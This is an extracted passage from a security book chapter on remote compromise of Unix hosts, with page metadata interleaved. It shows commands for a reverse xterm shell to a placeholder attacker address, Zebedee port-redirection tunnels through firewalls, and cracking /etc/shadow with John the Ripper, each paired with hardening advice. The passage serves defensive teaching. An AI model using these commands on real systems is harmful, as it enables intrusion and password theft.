    # Using xterm to Obtain a Remote Shell


    If the victim host has X terminal client software such as xterm installed, the
    attacker can execute it in order to receive a remote shell:


    ```

    xterm -display attacker''s_ip_address:0.0 &

    ```


    This command will cause an instance of xterm to execute on the victim host and
    display on the attacker''s X server. Of course, the attacker must first run the
    following command to allow xterm to display on his or her X server:


    ```

    xhost +victim''s_ip_address

    ```


    # Prevent Attackers from Obtaining Remote Shells


    Here are a few steps you can take to make it difficult for intruders to obtain
    a remote shell:


    +   - Configure your firewall to block all unused ports. In addition, tighten
    firewall rules to also restrict outgoing connections. For example, a host whose
    purpose is to only act as a web server must not be allowed to initiate outbound
    connections on any port.

    +   - Uninstall client software such as telnet, ftp, wget, and ftp from production
    hosts.

    +   - Uninstall X programs and libraries from production hosts.'
  merge: -1
  img_proc: true
- pgno: 162
  md: '# # PORT REDIRECTION


    Port redirection techniques can be used to circumvent weak firewall rules to connect
    to services that run on ports that are filtered by a firewall. To facilitate port
    redirection, we will be making use of Zebedee, a command-line tool available at
    [http://www.winton.org.uk/zebedee/](http://www.winton.org.uk/zebedee/). It is
    assumed that Zebedee is available on the victim machine. If not, then use the
    methods described in the earlier “Upload Netcat” section to upload a Zebedee binary
    onto the victim host.


    # ## Local Port Redirection


    Suppose an intruder needs to connect to a MySQL server on a host that has been
    compromised. If there is a firewall on or before the compromised host that allows
    inbound connections only on port 80, the intruder may execute the following on
    the victim machine:


    ```

    ```

    [victim_host]$ zebedee -T 80 -s 127.0.0.1:3306

    ```

    ```


    Next, the intruder may execute the following on his or her machine:


    ```

    ```

    [intruder''s_host]$ zebedee -T 80 victim''s_ip_address:3306:127.0.0.1:3306

    ```

    ```


    This will cause the Zebedee process on the intruder’s host to connect to the Zebedee
    process listening on port 80 of the victim’s host. The intruder may now connect
    to port 3306 of his or her host (127.0.0.1) in order to connect to port 3306 of
    the victim’s host via the Zebedee tunnel.


    > > An intruder may run the `ifconfig` and `route -n` commands on the victim host
    to identify additional network cards that may allow connections to internal networks.
    Instead of specifying 127.0.0.1 in the Zebedee command just described, the attacker
    may instead specify the IP address of an internal machine. This will cause Zebedee,
    which is listening on port 80 of the victim host, to redirect traffic to the specified
    internal host and port.


    # ## Remote Port Redirection


    Consider the case where a firewall on or before a victim host does not allow for
    any inbound connections and allows outbound connections only on port 80.


    We can use Zebedee to perform remote port forwarding, which will cause the Zebedee
    process running on the intruder’s host to wait for a connection from the client
    Zebedee process on the victim host.'
  merge: -1
  img_proc: true
- pgno: 163
  md: 'First, the intruder must run the following command on his or her host:


    ```

    [intruder''s_host]$ zebedee -1 3306:*:3306 -T 80

    ```


    Now, the intruder must run the following on the victim host:


    ```

    [victim_host]$ zebedee -T 80 -c intruder''s_ip_address -s 127.0.0.1

    ```


    This command will cause the Zebedee server process on the victim host to initiate
    an outbound connection to the Zebedee client process listening port 80 of the
    intruder''s host. When the intruder connects to port 3306 of his or her machine
    (127.0.0.1), he or she will in turn be connected to port 3306 of the victim''s
    machine via the Zebedee tunnel.


    > An intruder may run the ifconfig and route -n commands on the victim host to
    identify additional network cards that may allow connections to internal networks.
    The intruder may use an internal IP address instead of 127.0.0.1 in the preceding
    command to perform remote port-forwarding of ports listening on hosts in the victim''s
    internal network.


    # ### Harden Firewall Rules


    Tighten your firewall rules as much as possible. Make sure to also restrict outgoing
    connections. For example, a host whose purpose is to only act as a web server
    must not be allowed to initiate outbound connections on any port.


    # ## CRACKING /etc/shadow


    Most Unix and Linux distributions use shadowed passwords by default, where encrypted
    password hashes are stored in the /etc/shadow file. This file is readable only
    by root. Assuming an intruder has gained root access to a host, he or she may
    use a password cracker to crack the password hashes.


    # ### Using John to Crack /etc/shadow


    John the Ripper can be used to crack /etc/passwd:


    ```

    ```bash

    [bash]#  john /etc/shadow

    Loaded 2 passwords (FreeBSD MD5 [32/32])

    tricer4ckkingme             (root)

    johnnypwd                   (john)

    ```

    John the Ripper is available at [http://www.openwall.com/john/](http://www.openwall.com/john/).

    ```'
  merge: -1
  img_proc: true
- pgno: 164
  md: '# Use Strong Passwords


    Take the following steps to harden password requirement policies and to ensure
    strong passwords:


    +   - Force users to use strong passwords. Utilities such as `npasswd`, available
    at http://www.utexas.edu/cc/unix/software/npasswd/, and `pam_passwdqc`, available
    at http://www.openwall.com/passwdqc/, help enforce strong password policies.

    +   - Harden allowed password age and length. Depending upon your distribution,
    edit `/etc/default/passwd` or `/etc/login.defs` to do this.

    +   - Consider the use of dynamic password schemes such as S/KEY and SecurID.


    # SUMMARY


    This chapter focused on techniques used by intruders to remotely compromise vulnerable
    hosts. Tactics such as brute-forcing, sniffing, man-in-the-middle attacks, password
    cracking, port redirection, exploits against misconfigurations, buffer overflow,
    and other software vulnerabilities were discussed. Once an intruder has gained
    remote access to a vulnerable host, he or she will want to maintain access and
    escalate privileges using the methods described in the following chapters.'
  merge: -1
  img_proc: true
- pgno: 165
  md: '# Chapter 5


    # Privilege Escalation


    # IN THIS CHAPTER:


    +   - Exploiting Local Trust

    +   - Group Memberships and Incorrect File Permissions

    +   - “.” in PATH

    +   - Software Vulnerabilities

    +   - Summary'
